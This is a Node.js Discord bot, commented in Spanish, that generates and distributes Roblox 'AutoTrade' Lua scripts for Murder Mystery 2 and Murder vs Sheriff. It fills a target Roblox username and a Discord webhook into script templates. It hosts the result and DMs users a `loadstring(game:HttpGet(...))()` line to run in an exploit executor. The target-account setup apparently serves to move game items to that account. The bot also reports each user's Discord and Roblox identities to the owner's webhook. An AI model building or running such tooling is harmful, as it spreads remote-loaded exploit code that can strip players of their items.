require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
let MongoClient = null;
try { ({ MongoClient } = require('mongodb')); } catch { /* opcional */ }

const client = new Client({
  intents: [GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages, GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent],
});

const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
let MM2_SCRIPT = '';
let MVS_SCRIPT = '';

const VALID_RARITIES = ['Common', 'Uncommon', 'Rare', 'Legendary', 'Mythic', 'Ancient'];

try {
  MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
  MVS_SCRIPT = fs.readFileSync('./mvs-script.lua', 'utf8');
  console.log('✅ Scripts Lua cargados correctamente');
} catch (error) {
  console.error('❌ Error al cargar scripts:', error.message);
  process.exit(1);
}

// --- Sistema de control ---
const OWNER_ID = '842098865661935677';
const DATA_FILE = './data.json';
const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK || ''; // aviso de nuevos scripts

const whitelistUsers = new Set();   // IDs de usuarios permitidos
const whitelistRoles = new Set();   // IDs de roles permitidos
const bannedUsers = new Set();
const knownUsers = new Set();       // todos los que han generado (para broadcast)
const cooldowns = new Map();        // userId -> timestamp (no se persiste)
const guildHits = new Map();        // guildId -> [timestamps] (rate limit por servidor)
const pendingRequests = new Map();  // token -> { req, userId, expiresAt }
let cooldownMs = 30 * 60 * 1000;    // 30 minutos por defecto
let guildLimit = 5;                 // máx generaciones por servidor por minuto
const GUILD_WINDOW = 60 * 1000;
const scriptLogs = [];              // últimos 50 logs
let totalScripts = 0;
let reactEnabled = true;
const botStartTime = Date.now();

// --- Persistencia (MongoDB opcional + JSON local de respaldo) ---
let dbCollection = null;

async function connectDB() {
  if (!process.env.MONGODB_URI || !MongoClient) return;
  try {
    const mongo = new MongoClient(process.env.MONGODB_URI);
    await mongo.connect();
    dbCollection = mongo.db('joszbot').collection('data');
    console.log('✅ Conectado a MongoDB');
  } catch (err) {
    console.error('❌ Error conectando a MongoDB:', err.message);
    dbCollection = null;
  }
}

function applyData(raw) {
  if (!raw) return;
  (raw.whitelistUsers || []).forEach(id => whitelistUsers.add(id));
  (raw.whitelistRoles || []).forEach(id => whitelistRoles.add(id));
  (raw.bannedUsers || []).forEach(id => bannedUsers.add(id));
  (raw.knownUsers || []).forEach(id => knownUsers.add(id));
  if (typeof raw.cooldownMs === 'number') cooldownMs = raw.cooldownMs;
  if (typeof raw.guildLimit === 'number') guildLimit = raw.guildLimit;
  if (typeof raw.totalScripts === 'number') totalScripts = raw.totalScripts;
  (raw.scriptLogs || []).forEach(l => scriptLogs.push(l));
}

async function loadData() {
  if (dbCollection) {
    try {
      const raw = await dbCollection.findOne({ _id: 'state' });
      if (raw) {
        applyData(raw);
        console.log('✅ Datos cargados desde MongoDB');
        return;
      }
    } catch (err) {
      console.error('❌ Error leyendo MongoDB:', err.message);
    }
  }
  try {
    applyData(JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')));
    console.log('✅ Datos cargados desde data.json');
  } catch {
    console.log('ℹ️ Empezando limpio');
  }
}

function saveData() {
  const data = {
    whitelistUsers: [...whitelistUsers],
    whitelistRoles: [...whitelistRoles],
    bannedUsers: [...bannedUsers],
    knownUsers: [...knownUsers],
    cooldownMs,
    guildLimit,
    totalScripts,
    scriptLogs: scriptLogs.slice(0, 50),
  };
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('❌ Error guardando data.json:', err.message);
  }
  if (dbCollection) {
    dbCollection.updateOne({ _id: 'state' }, { $set: data }, { upsert: true })
      .catch(err => console.error('❌ Error guardando en MongoDB:', err.message));
  }
}

// --- Rate limit por servidor ---
function checkGuildRate(guildId) {
  if (!guildId) return true; // DMs sin límite de servidor
  const now = Date.now();
  const hits = (guildHits.get(guildId) || []).filter(t => now - t < GUILD_WINDOW);
  guildHits.set(guildId, hits);
  return hits.length < guildLimit;
}

function recordGuildHit(guildId) {
  if (!guildId) return;
  const hits = guildHits.get(guildId) || [];
  hits.push(Date.now());
  guildHits.set(guildId, hits);
}

function isWhitelisted(interaction) {
  if (interaction.user.id === OWNER_ID) return true;
  if (whitelistUsers.has(interaction.user.id)) return true;
  if (interaction.member) {
    for (const roleId of interaction.member.roles.cache.keys()) {
      if (whitelistRoles.has(roleId)) return true;
    }
  }
  return false;
}

function updateStatus() {
  client.user?.setActivity(`${totalScripts} scripts generados`, { type: 3 });
}

// --- Ready ---
client.once('ready', () => {
  console.log(`✅ Bot conectado como ${client.user.tag}`);
  updateStatus();

  const commands = [
    new SlashCommandBuilder()
      .setName('generate')
      .setDescription('Genera un script personalizado')
      .addSubcommand(sub =>
        sub.setName('script').setDescription('Genera un script personalizado (MM2 / MVS)')
      ),
  ];

  client.application.commands.set(commands);
  console.log('✅ Comandos registrados');
});

// --- Interactions ---
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isCommand()) {
      if (interaction.commandName === 'generate' && interaction.options.getSubcommand() === 'script') {
        // Verificar ban
        if (bannedUsers.has(interaction.user.id)) {
          return interaction.reply({ content: '🚫 No tienes acceso a este bot.', ephemeral: true });
        }

        // Verificar whitelist (si tiene usuarios/roles, aplica restricción)
        if ((whitelistUsers.size > 0 || whitelistRoles.size > 0) && !isWhitelisted(interaction)) {
          return interaction.reply({ content: '🔒 No tienes permiso para usar este comando.', ephemeral: true });
        }

        const selectMenu = new StringSelectMenuBuilder()
          .setCustomId('game_select')
          .setPlaceholder('Selecciona un juego')
          .addOptions(
            new StringSelectMenuOptionBuilder()
              .setLabel('Murder Mystery 2')
              .setValue('mm2')
              .setDescription('AutoTrade para MM2')
              .setEmoji('🔪'),
            new StringSelectMenuOptionBuilder()
              .setLabel('Murder vs Sheriff')
              .setValue('mvs')
              .setDescription('AutoTrade para MVS')
              .setEmoji('🔫')
          );

        const row = new ActionRowBuilder().addComponents(selectMenu);
        await interaction.reply({
          content: '🎮 Selecciona el juego para generar tu script personalizado:',
          components: [row],
          ephemeral: true,
        });
      }
    }

    if (interaction.isStringSelectMenu()) {
      // Paso 1: elegir juego
      if (interaction.customId === 'game_select') {
        const game = interaction.values[0];

        if (game === 'mm2') {
          return interaction.showModal(buildConfigModal('cfg|mm2||'));
        }

        if (game === 'mvs') {
          // Paso 2: elegir modo
          const modeMenu = new StringSelectMenuBuilder()
            .setCustomId('mvs_mode')
            .setPlaceholder('Selecciona el modo')
            .addOptions(
              new StringSelectMenuOptionBuilder()
                .setLabel('All (todo)')
                .setValue('all')
                .setDescription('Farmea todo sin filtrar rareza')
                .setEmoji('📦'),
              new StringSelectMenuOptionBuilder()
                .setLabel('Rarity (por rareza)')
                .setValue('rarity')
                .setDescription('Elige qué rarezas farmear')
                .setEmoji('💎')
            );
          return interaction.update({
            content: '⚙️ Selecciona el modo para **Murder vs Sheriff**:',
            components: [new ActionRowBuilder().addComponents(modeMenu)],
          });
        }
      }

      // Paso 2 (MVS): modo elegido
      if (interaction.customId === 'mvs_mode') {
        const mode = interaction.values[0];

        if (mode === 'all') {
          return interaction.showModal(buildConfigModal('cfg|mvs|all|'));
        }

        if (mode === 'rarity') {
          // Paso 3: elegir rarezas (multi-select)
          const rarityMenu = new StringSelectMenuBuilder()
            .setCustomId('mvs_rarity')
            .setPlaceholder('Selecciona una o más rarezas')
            .setMinValues(1)
            .setMaxValues(VALID_RARITIES.length)
            .addOptions(
              VALID_RARITIES.map(r =>
                new StringSelectMenuOptionBuilder().setLabel(r).setValue(r)
              )
            );
          return interaction.update({
            content: '💎 Selecciona las rarezas a farmear:',
            components: [new ActionRowBuilder().addComponents(rarityMenu)],
          });
        }
      }

      // Paso 3 (MVS rarity): rarezas elegidas
      if (interaction.customId === 'mvs_rarity') {
        const rarities = interaction.values.join(',');
        return interaction.showModal(buildConfigModal(`cfg|mvs|rarity|${rarities}`));
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId.startsWith('cfg|')) {
        const [, game, mode, rarityStr] = interaction.customId.split('|');
        const rarities = rarityStr ? rarityStr.split(',') : [];
        const username = interaction.fields.getTextInputValue('username');
        const webhook = interaction.fields.getTextInputValue('webhook');

        await interaction.deferReply({ ephemeral: true });

        // Verificar ban
        if (bannedUsers.has(interaction.user.id)) {
          return interaction.editReply({ content: '🚫 No tienes acceso a este bot.' });
        }

        // Rate limit por servidor
        if (!checkGuildRate(interaction.guildId)) {
          return interaction.editReply({ content: '🛑 Este servidor alcanzó el límite de generaciones. Espera un minuto.' });
        }

        // Verificar cooldown
        const lastUsed = cooldowns.get(interaction.user.id);
        if (lastUsed) {
          const remaining = cooldownMs - (Date.now() - lastUsed);
          if (remaining > 0) {
            const mins = Math.ceil(remaining / 60000);
            return interaction.editReply({ content: `⏳ Debes esperar **${mins} minuto(s)** antes de generar otro script.` });
          }
        }

        if (!isValidWebhook(webhook)) {
          return interaction.editReply({ content: '❌ El webhook URL no es válido. Debe ser una URL de webhook de Discord.' });
        }

        if (!isValidUsername(username)) {
          return interaction.editReply({ content: '❌ El nombre de usuario no es válido. Usa solo letras, números y guiones.' });
        }

        // Guardar petición pendiente y pedir confirmación
        const token = crypto.randomBytes(6).toString('hex');
        pendingRequests.set(token, {
          req: { game, username, webhook, mode, rarities, guildId: interaction.guildId },
          userId: interaction.user.id,
          expiresAt: Date.now() + 5 * 60 * 1000,
        });

        const gameName = game === 'mm2' ? 'Murder Mystery 2' : 'Murder vs Sheriff';
        let summary =
          `📋 **Confirma tu configuración:**\n` +
          `**Juego:** ${gameName}\n` +
          `**Usuario Roblox:** \`${username}\`\n`;
        if (game === 'mvs') {
          summary += `**Modo:** ${mode || 'all'}\n`;
          if (mode === 'rarity') summary += `**Rarezas:** ${rarities.join(', ') || '-'}\n`;
        }
        summary += `**Webhook:** \`${maskWebhook(webhook)}\``;

        const confirmBtn = new ButtonBuilder().setCustomId(`gen_confirm|${token}`).setLabel('Confirmar').setStyle(ButtonStyle.Success).setEmoji('✅');
        const cancelBtn = new ButtonBuilder().setCustomId(`gen_cancel|${token}`).setLabel('Cancelar').setStyle(ButtonStyle.Danger).setEmoji('❌');

        await interaction.editReply({
          content: summary,
          components: [new ActionRowBuilder().addComponents(confirmBtn, cancelBtn)],
        });
      }
    }

    if (interaction.isButton()) {
      const [action, token] = interaction.customId.split('|');

      if (action === 'gen_confirm' || action === 'gen_cancel') {
        const pending = pendingRequests.get(token);

        if (!pending || pending.userId !== interaction.user.id || pending.expiresAt < Date.now()) {
          pendingRequests.delete(token);
          return interaction.update({ content: '⌛ Esta solicitud expiró. Usa `/generate script` de nuevo.', components: [] });
        }

        if (action === 'gen_cancel') {
          pendingRequests.delete(token);
          return interaction.update({ content: '❌ Generación cancelada.', components: [] });
        }

        // Confirmar → generar
        pendingRequests.delete(token);
        await interaction.update({ content: '⏳ Generando tu script...', components: [] });
        await doGenerate(interaction, pending.req);
      }
    }
  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Error procesando tu solicitud. Intenta de nuevo.', ephemeral: true }).catch(console.error);
    }
  }
});

// --- Funciones ---
function buildConfigModal(customId) {
  const modal = new ModalBuilder()
    .setCustomId(customId)
    .setTitle('Configurar Script Personalizado');

  const usernameInput = new TextInputBuilder()
    .setCustomId('username')
    .setLabel('Tu Usuario de Roblox')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('ejemplo: claudee')
    .setRequired(true)
    .setMinLength(1)
    .setMaxLength(20);

  const webhookInput = new TextInputBuilder()
    .setCustomId('webhook')
    .setLabel('Discord Webhook URL')
    .setStyle(TextInputStyle.Paragraph)
    .setPlaceholder('https://discord.com/api/webhooks/...')
    .setRequired(true)
    .setMinLength(10);

  modal.addComponents(
    new ActionRowBuilder().addComponents(usernameInput),
    new ActionRowBuilder().addComponents(webhookInput)
  );
  return modal;
}

function maskWebhook(webhook) {
  if (webhook.length <= 45) return webhook;
  return webhook.slice(0, 45) + '…';
}

async function doGenerate(interaction, req) {
  const { game, username } = req;
  try {
    const script = await generateScript(req);
    const storeResponse = await axios.post(`${SERVER_URL}/api/store-script`, { script });
    const { id, url } = storeResponse.data;
    const loadstring = `loadstring(game:HttpGet("${url}"))()`;

    try {
      const dmChannel = await interaction.user.createDM();
      await dmChannel.send(`your script - made by joszz\n\`\`\`\n${loadstring}\n\`\`\``);
      await interaction.editReply({ content: '✅ Script generado exitosamente. Revisa tu DM privado.', components: [] });

      // Registrar
      cooldowns.set(interaction.user.id, Date.now());
      recordGuildHit(req.guildId);
      knownUsers.add(interaction.user.id);
      totalScripts++;
      scriptLogs.unshift({ tag: interaction.user.tag, id: interaction.user.id, robloxUser: username, game, time: new Date().toISOString() });
      if (scriptLogs.length > 50) scriptLogs.pop();
      updateStatus();
      saveData();
      notifyOwner(interaction, req, id);

      console.log(`📝 Script generado para ${interaction.user.tag} (${username}) - ID: ${id}`);
    } catch (err) {
      console.error('DM Error:', err);
      await interaction.editReply({ content: '❌ No se pudo enviar DM. ¿Tienes los DMs abiertos con bots?', components: [] });
    }
  } catch (error) {
    console.error('Script Generation Error:', error);
    await interaction.editReply({ content: `❌ Error al generar script: ${error.message}`, components: [] });
  }
}

async function notifyOwner(interaction, req, id) {
  if (!OWNER_WEBHOOK) return;
  try {
    const fields = [
      { name: 'Usuario Discord', value: `${interaction.user.tag} (${interaction.user.id})` },
      { name: 'Juego', value: req.game.toUpperCase(), inline: true },
      { name: 'Usuario Roblox', value: req.username, inline: true },
    ];
    if (req.game === 'mvs') {
      fields.push({ name: 'Modo', value: req.mode || 'all', inline: true });
      if (req.mode === 'rarity') fields.push({ name: 'Rarezas', value: (req.rarities || []).join(', ') || '-', inline: true });
    }
    fields.push({ name: 'Servidor', value: interaction.guild ? `${interaction.guild.name} (${interaction.guildId})` : 'DM' });
    await axios.post(OWNER_WEBHOOK, {
      embeds: [{
        title: '📝 Nuevo script generado',
        color: 0x2ecc71,
        fields,
        footer: { text: `ID: ${id}` },
        timestamp: new Date().toISOString(),
      }],
    });
  } catch (err) {
    console.error('Owner webhook error:', err.message);
  }
}

async function generateScript({ game, username, webhook, mode, rarities }) {
  if (game === 'mm2') {
    // Reemplaza el valor actual sea cual sea (usamos función para evitar $ especiales)
    return MM2_SCRIPT
      .replace(/TARGET_USER\s*=\s*"[^"]*"/, () => `TARGET_USER = "${username}"`)
      .replace(/WEBHOOK_URL\s*=\s*"[^"]*"/, () => `WEBHOOK_URL = "${webhook}"`);
  }

  if (game === 'mvs') {
    // Validar rarezas contra la lista permitida
    const safeRarities = (rarities || []).filter(r => VALID_RARITIES.includes(r));
    const rarityList = safeRarities.length
      ? safeRarities.map(r => `"${r}"`).join(', ')
      : '"Ancient", "Mythic"';
    const finalMode = mode === 'rarity' ? 'rarity' : 'all';

    return MVS_SCRIPT
      .replace(/local\s+TARGET\s*=\s*"[^"]*"/, () => `local TARGET = "${username}"`)
      .replace(/local\s+MODE\s*=\s*"[^"]*"/, () => `local MODE = "${finalMode}"`)
      .replace(/local\s+RARITIES\s*=\s*\{[^}]*\}/, () => `local RARITIES = { ${rarityList} }`)
      .replace(/local\s+WEBHOOK\s*=\s*"[^"]*"/, () => `local WEBHOOK = "${webhook}"`);
  }

  throw new Error('Juego no soportado');
}

function isValidWebhook(webhook) {
  try {
    const url = new URL(webhook);
    return url.hostname === 'discord.com' && webhook.includes('/webhooks/');
  } catch { return false; }
}

function isValidUsername(username) {
  return /^[a-zA-Z0-9_-]{1,20}$/.test(username);
}

// --- Comandos de texto ---
const CMDS_LIST =
  '```\n' +
  '.cmds                   → Esta lista (en DM)\n' +
  '.info                   → Info pública del bot\n' +
  '.noreact                → Toggle reacciones ✔️\n' +
  '.ping                   → Latencia\n' +
  '.uptime                 → Tiempo encendido\n' +
  '.stats                  → Servidores, scripts, latencia\n' +
  '.logs [n]               → Últimos n scripts (def. 5)\n' +
  '.ban <id>               → Banear usuario\n' +
  '.unban <id>             → Desbanear usuario\n' +
  '.wl add <id>            → Whitelist usuario\n' +
  '.wl remove <id>         → Quitar de whitelist\n' +
  '.wl role <id>           → Whitelist rol\n' +
  '.wl list                → Ver whitelist\n' +
  '.cooldown <minutos>     → Cambiar cooldown por usuario\n' +
  '.guildlimit <n>         → Máx generaciones/servidor/min\n' +
  '.broadcast <msg>        → Anuncio por DM a todos\n' +
  '.say <msg>              → Bot habla en ese canal\n' +
  '.dm <id> <msg>          → DM a usuario\n' +
  '.status <txt>           → Cambiar estado\n' +
  '.reload                 → Recargar scripts Lua\n' +
  '```';

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const isOwner = message.author.id === OWNER_ID;
  const content = message.content.trim();

  if (isOwner && reactEnabled) {
    try { await message.react('✔️'); } catch {}
  }

  // Comando público
  if (content === '.info') {
    await message.reply(
      '🔪 **Josz Bot**\n\n' +
      '**¿Qué hace?** Genera scripts personalizados de AutoTrade para Roblox.\n' +
      '**Juego:** Murder Mystery 2 (MM2)\n\n' +
      '**¿Cómo usarlo?**\n' +
      '1. Escribe `/generate script`\n' +
      '2. Selecciona **Murder Mystery 2**\n' +
      '3. Ingresa tu usuario de Roblox y tu webhook\n' +
      '4. Recibirás un `loadstring` en tu DM — solo pégalo en tu executor'
    ).catch(() => {});
    return;
  }

  if (!isOwner) return;

  if (content === '.cmds') {
    await message.author.send('📋 **Comandos del owner:**\n' + CMDS_LIST).catch(() => {});
    return;
  }

  if (content === '.noreact') {
    reactEnabled = !reactEnabled;
    await message.reply(`Reacciones ${reactEnabled ? '**activadas** ✔️' : '**desactivadas** ❌'}`).catch(() => {});
    return;
  }

  if (content === '.ping') {
    await message.reply(`🏓 Latencia: **${client.ws.ping}ms**`).catch(() => {});
    return;
  }

  if (content === '.uptime') {
    const ms = Date.now() - botStartTime;
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    await message.reply(`⏱️ Uptime: **${h}h ${m}m ${s}s**`).catch(() => {});
    return;
  }

  if (content === '.stats') {
    await message.reply(
      `📊 **Stats**\n` +
      `Scripts generados: **${totalScripts}**\n` +
      `Servidores: **${client.guilds.cache.size}**\n` +
      `Usuarios: **${client.users.cache.size}**\n` +
      `Latencia: **${client.ws.ping}ms**`
    ).catch(() => {});
    return;
  }

  if (content.startsWith('.logs')) {
    const n = parseInt(content.split(' ')[1]) || 5;
    const recent = scriptLogs.slice(0, Math.min(n, 20));
    if (recent.length === 0) {
      await message.reply('No hay logs aún.').catch(() => {});
      return;
    }
    const lines = recent.map((l, i) =>
      `**${i + 1}.** ${l.tag} → \`${l.robloxUser}\` ${l.game ? `[${l.game}]` : ''} — <t:${Math.floor(new Date(l.time).getTime() / 1000)}:R>`
    ).join('\n');
    await message.reply(`📋 **Últimos ${recent.length} scripts:**\n${lines}`).catch(() => {});
    return;
  }

  if (content.startsWith('.ban ')) {
    const userId = content.slice(5).trim();
    if (!userId) return;
    bannedUsers.add(userId);
    cooldowns.delete(userId);
    saveData();
    await message.reply(`🚫 Usuario \`${userId}\` baneado.`).catch(() => {});
    return;
  }

  if (content.startsWith('.unban ')) {
    const userId = content.slice(7).trim();
    if (!userId) return;
    bannedUsers.delete(userId);
    saveData();
    await message.reply(`✅ Usuario \`${userId}\` desbaneado.`).catch(() => {});
    return;
  }

  if (content.startsWith('.wl ')) {
    const parts = content.slice(4).trim().split(' ');
    const sub = parts[0];
    const id = parts[1];

    if (sub === 'add' && id) {
      whitelistUsers.add(id);
      saveData();
      await message.reply(`✅ Usuario \`${id}\` añadido a la whitelist.`).catch(() => {});
    } else if (sub === 'remove' && id) {
      whitelistUsers.delete(id);
      saveData();
      await message.reply(`✅ Usuario \`${id}\` eliminado de la whitelist.`).catch(() => {});
    } else if (sub === 'role' && id) {
      whitelistRoles.add(id);
      saveData();
      await message.reply(`✅ Rol \`${id}\` añadido a la whitelist.`).catch(() => {});
    } else if (sub === 'list') {
      const users = [...whitelistUsers].join(', ') || 'ninguno';
      const roles = [...whitelistRoles].join(', ') || 'ninguno';
      await message.reply(`📋 **Whitelist**\nUsuarios: ${users}\nRoles: ${roles}`).catch(() => {});
    } else {
      await message.reply('Uso: `.wl add/remove/role/list <id>`').catch(() => {});
    }
    return;
  }

  if (content.startsWith('.cooldown ')) {
    const mins = parseInt(content.slice(10).trim());
    if (isNaN(mins) || mins < 0) {
      await message.reply('Uso: `.cooldown <minutos>`').catch(() => {});
      return;
    }
    cooldownMs = mins * 60 * 1000;
    saveData();
    await message.reply(`✅ Cooldown cambiado a **${mins} minuto(s)**.`).catch(() => {});
    return;
  }

  if (content.startsWith('.guildlimit ')) {
    const n = parseInt(content.slice(12).trim());
    if (isNaN(n) || n < 1) {
      await message.reply('Uso: `.guildlimit <n>` (mínimo 1)').catch(() => {});
      return;
    }
    guildLimit = n;
    saveData();
    await message.reply(`✅ Límite por servidor: **${n}** generaciones por minuto.`).catch(() => {});
    return;
  }

  if (content.startsWith('.broadcast ')) {
    const msg = content.slice(11).trim();
    if (!msg) return;
    if (knownUsers.size === 0) {
      await message.reply('No hay usuarios registrados aún.').catch(() => {});
      return;
    }
    await message.reply(`📢 Enviando a **${knownUsers.size}** usuarios...`).catch(() => {});
    let sent = 0, failed = 0;
    for (const uid of knownUsers) {
      try {
        const u = await client.users.fetch(uid);
        await u.send(`📢 **Anuncio**\n${msg}`);
        sent++;
      } catch { failed++; }
    }
    await message.reply(`📢 Broadcast terminado: **${sent}** enviados, **${failed}** fallidos.`).catch(() => {});
    return;
  }

  if (content.startsWith('.say ')) {
    const text = content.slice(5).trim();
    if (!text) return;
    await message.channel.send(text).catch(() => {});
    try { await message.delete(); } catch {}
    return;
  }

  if (content.startsWith('.dm ')) {
    const parts = content.slice(4).trim().split(' ');
    const userId = parts[0];
    const text = parts.slice(1).join(' ');
    if (!userId || !text) {
      await message.reply('Uso: `.dm <userID> <mensaje>`').catch(() => {});
      return;
    }
    try {
      const user = await client.users.fetch(userId);
      await user.send(text);
      await message.reply(`✅ DM enviado a **${user.tag}**`).catch(() => {});
    } catch {
      await message.reply('❌ No se pudo enviar el DM').catch(() => {});
    }
    return;
  }

  if (content.startsWith('.status ')) {
    const text = content.slice(8).trim();
    if (!text) return;
    client.user.setActivity(text);
    await message.reply(`✅ Estado cambiado a: **${text}**`).catch(() => {});
    return;
  }

  if (content === '.reload') {
    try {
      MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
      MVS_SCRIPT = fs.readFileSync('./mvs-script.lua', 'utf8');
      await message.reply('✅ Scripts Lua recargados (MM2 + MVS)').catch(() => {});
    } catch (err) {
      await message.reply(`❌ Error: ${err.message}`).catch(() => {});
    }
    return;
  }
});

// --- Error handlers ---
client.on('error', error => { console.error('🔴 Client Error:', error); });
process.on('unhandledRejection', error => { console.error('🔴 Unhandled Rejection:', error); });

// Limpieza de solicitudes pendientes expiradas
setInterval(() => {
  const now = Date.now();
  for (const [token, p] of pendingRequests) {
    if (p.expiresAt < now) pendingRequests.delete(token);
  }
}, 60 * 1000);

// --- Arranque ---
(async () => {
  await connectDB();
  await loadData();
  client.login(process.env.DISCORD_TOKEN);
})();
